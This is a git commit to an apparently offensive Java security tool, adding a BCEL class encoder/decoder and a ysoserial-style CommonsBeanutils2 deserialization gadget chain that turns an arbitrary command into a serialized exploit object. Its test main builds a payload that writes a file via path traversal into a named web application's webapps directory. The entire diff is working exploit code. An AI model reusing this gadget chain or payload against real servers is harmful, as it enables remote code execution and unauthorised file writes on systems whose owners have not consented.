64e603b4a0ff530a13c99c0211aee6c990063a86
_0xf4n9x_ <fanqxu@gmail.com>
2022-12-27 00:12:52 +0800

    新增漏洞利用功能部分代码

---
+++ src/me/gv7/woodpecker/bcel/HackBCELs.java
@@ -0,0 +1,30 @@
+package me.gv7.woodpecker.bcel;
+
+import me.gv7.woodpecker.bcel.classfile.Utility;
+
+import java.io.*;
+
+public class HackBCELs {
+    public static byte[] decode(String strBCEL) throws IOException {
+        strBCEL = strBCEL.replace("$$BCEL$$","");
+        byte[] clazzBytes = me.gv7.woodpecker.bcel.classfile.Utility.decode(strBCEL,true);
+        return clazzBytes;
+    }
+
+    public static String encode(String classFilePath) throws Exception{
+        byte[] clazzBytes = getFileBytes(classFilePath);
+        return encode(clazzBytes);
+    }
+
+    public static String encode(byte[] clazzBytes) throws IOException {
+        return "$$BCEL$$" + Utility.encode(clazzBytes,true);
+    }
+
+    public static byte[] getFileBytes(String file) throws Exception {
+        File f = new File(file);
+        int length = (int) f.length();
+        byte[] data = new byte[length];
+        new FileInputStream(f).read(data);
+        return data;
+    }
+}
---
+++ src/me/gv7/woodpecker/yso/payloads/CommonsBeanutils2.java
@@ -0,0 +1,38 @@
+package me.gv7.woodpecker.yso.payloads;
+
+import me.gv7.woodpecker.yso.payloads.annotation.Authors;
+import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
+import me.gv7.woodpecker.yso.payloads.util.Gadgets;
+import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
+import org.apache.commons.beanutils.BeanComparator;
+import java.util.PriorityQueue;
+
+import static me.gv7.woodpecker.yso.payloads.util.Reflections.setFieldValue;
+
+@SuppressWarnings({ "rawtypes", "unchecked" })
+@Dependencies({"commons-beanutils:commons-beanutils:1.9.2","commons-logging:commons-logging:1.2"})
+@Authors({ Authors.PHITHON })
+public class CommonsBeanutils2 implements ObjectPayload<Object>  {
+
+    //    @Override
+    public Object getObject(String command) throws Exception {
+        final Object templates = Gadgets.createTemplatesImpl(command);
+        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
+        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
+        // stub data for replacement later
+        queue.add("1");
+        queue.add("1");
+
+        setFieldValue(comparator, "property", "outputProperties");
+        setFieldValue(queue, "queue", new Object[]{templates, templates});
+
+        return queue;
+    }
+
+    public static void main(String[] args) throws Exception {
+        args = new String[]{"upload_file_base64:..//webapps//CDGServer3//testttttt.txt|YWJjMTIz"};
+//        PayloadRunner.run(CommonsBeanutils2.class, args);
+        String s1 = PayloadRunner.run(CommonsBeanutils2.class, args);
+        System.out.println(s1);
+    }
+}
